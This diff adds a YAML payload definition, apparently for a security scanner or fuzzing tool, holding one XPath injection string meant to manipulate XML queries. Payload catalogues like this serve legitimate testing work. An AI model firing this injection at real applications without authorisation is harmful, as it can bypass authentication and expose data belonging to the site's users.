@@ -1,0 +1,7 @@
+name: "XPATH_INJECTION"
+description: >
+  Injects XPath condition to manipulate queries.
+payloads:
+  - id: xpath_injection
+    payload: "' or count(//user) = 1 or '1' = '2"
+    description: Injects XPath condition to manipulate queries.
